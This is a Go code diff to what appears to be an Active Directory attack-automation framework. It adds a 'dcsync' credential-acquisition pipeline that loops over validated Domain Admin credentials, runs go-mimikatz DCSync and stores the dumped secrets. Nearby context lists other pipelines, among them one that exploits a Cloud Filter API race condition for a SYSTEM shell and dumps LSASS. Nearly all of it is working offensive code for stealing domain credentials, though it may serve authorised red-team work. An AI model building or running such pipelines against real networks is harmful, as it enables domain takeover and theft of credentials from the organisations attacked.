@@ -99,6 +99,14 @@ var acquisitionPipelines = map[string]PipelineDef{
 		ParseFn:     parseMimikatzOutput,
 		Description: "Upload MiniPlasma.exe, exploit Cloud Filter API race condition for SYSTEM shell, dump LSASS",
 	},
+	"dcsync": {
+		Name:        "dcsync",
+		Delivery:    "donut",
+		PayloadType: "go-mimikatz",
+		RemoteExec:  false,
+		ParseFn:     parseMimikatzOutput,
+		Description: "DCSync via go-mimikatz sekurlsa::dcsync for each DA credential",
+	},
 }
 
 type PipelineDef struct {
@@ -163,6 +171,8 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 		return executePhantomKillerPipeline(state, host, pipeline)
 	case "miniplasma":
 		return executeMiniPlasmaPipeline(state, host, pipeline)
+	case "dcsync":
+		return executeDCSyncPipeline(state, host, pipeline)
 	default:
 		return executeMimikatzPipeline(state, host, pipeline)
 	}
@@ -983,6 +993,83 @@ func executeMiniPlasmaPipeline(state *core.ADState, host core.Host, pipeline Pip
 			Timestamp: time.Now(),
 		})
 	}
+	return result
+}
+
+func executeDCSyncPipeline(state *core.ADState, _ core.Host, _ PipelineDef) *core.ToolResult {
+	result := &core.ToolResult{Success: true}
+
+	if !tools.GoMimikatz.Available() {
+		fmt.Println("[!] go-mimikatz not available for DCSync")
+		result.Success = false
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "dcsync", Key: "error", Value: "go-mimikatz not available",
+			Timestamp: time.Now(),
+		})
+		return result
+	}
+
+	ctx := context.Background()
+	synced := 0
+	for _, c := range state.Creds {
+		if !c.Validated {
+			continue
+		}
+		isDA := false
+		for _, u := range state.Users {
+			if u.Username == c.Username && u.Domain == c.Domain && u.IsDA {
+				isDA = true
+				break
+			}
+		}
+		if !isDA {
+			continue
+		}
+
+		fmt.Printf("[*] DCSync for %s\\%s...\n", c.Domain, c.Username)
+		req := tools.ExecutionRequest{
+			Env: map[string]string{
+				"DOMAIN": c.Domain,
+				"USER":   c.Username,
+			},
+		}
+		r, err := tools.GoMimikatz.SekurlsaDcsync(ctx, req)
+		if err != nil || !r.Success {
+			fmt.Printf("[!] DCSync failed for %s\\%s: %v\n", c.Domain, c.Username, err)
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+				Source: "dcsync", Key: c.Username + "@" + c.Domain,
+				Value: "DCSync failed", Confidence: 0.5, RawOutput: r.Stdout,
+				Timestamp: time.Now(),
+			})
+			continue
+		}
+
+		creds := parseMimikatzOutput(r.Stdout)
+		result.Creds = append(result.Creds, creds...)
+		for _, dc := range creds {
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+				Source: "dcsync", Key: dc.Username + "@" + dc.Domain,
+				Value: dc.Secret, Confidence: 0.9, RawOutput: r.Stdout,
+				Timestamp: time.Now(),
+			})
+		}
+		synced++
+	}
+
+	if synced == 0 {
+		fmt.Println("[!] No DA credentials with validated creds found for DCSync")
+		result.Success = false
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "dcsync", Key: "status", Value: "no DA creds available",
+			Timestamp: time.Now(),
+		})
+	}
+
+	fmt.Printf("[*] DCSync complete: %d DA credentials synced\n", synced)
 	return result
 }
 
